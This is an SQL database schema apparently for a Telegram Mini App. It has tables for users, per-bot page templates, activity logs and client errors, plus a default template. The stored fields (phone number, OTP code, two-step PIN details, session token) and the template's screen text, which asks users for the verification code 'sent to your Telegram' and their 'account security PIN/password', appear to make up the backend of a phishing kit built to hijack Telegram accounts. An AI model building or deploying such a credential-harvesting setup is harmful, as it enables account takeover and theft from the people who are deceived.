-- Cloudflare D1 (SQLite) Database Schema for Telegram Mini App

CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  tg_id TEXT UNIQUE NOT NULL,
  first_name TEXT DEFAULT '',
  last_name TEXT DEFAULT '',
  username TEXT DEFAULT '',
  bot_id TEXT DEFAULT 'default',
  phone_number TEXT DEFAULT '',
  state TEXT DEFAULT 'need_phone',
  otp_code TEXT DEFAULT '',
  otp_expires_at INTEGER DEFAULT 0,
  twofa_enabled INTEGER DEFAULT 0,
  twofa_pin_hash TEXT DEFAULT '',
  twofa_hint TEXT DEFAULT '',
  session_token TEXT DEFAULT '',
  created_at TEXT DEFAULT CURRENT_TIMESTAMP,
  updated_at TEXT DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS bot_templates (
  bot_id TEXT PRIMARY KEY,
  color TEXT DEFAULT 'default',
  background_url TEXT DEFAULT '',
  background_blur INTEGER DEFAULT 0,
  config_json TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS activity_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  bot_id TEXT,
  tg_id TEXT,
  event_type TEXT,
  action_name TEXT,
  value TEXT,
  valid INTEGER,
  user_agent TEXT,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS client_errors (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  bot_id TEXT,
  tg_id TEXT,
  where_loc TEXT,
  message TEXT,
  stack TEXT,
  url TEXT,
  ua TEXT,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP
);

INSERT OR IGNORE INTO bot_templates (bot_id, color, background_url, background_blur, config_json)
VALUES (
  'default',
  'default',
  '',
  0,
  '{"start":{"title":"Phone Verification","description":"Enter your phone number to receive a verification code.","buttonText":"Send Code"},"code":{"title":"Enter Verification Code","description":"We sent a 6-digit verification code to your Telegram.","buttonText":"Verify Code"},"pass":{"title":"Two-Step Verification","description":"Enter your account security PIN/password.","buttonText":"Continue"},"end":{"title":"Verified & Logged In","description":"Your session is now active and securely stored.","buttonText":"Done"}}'
);
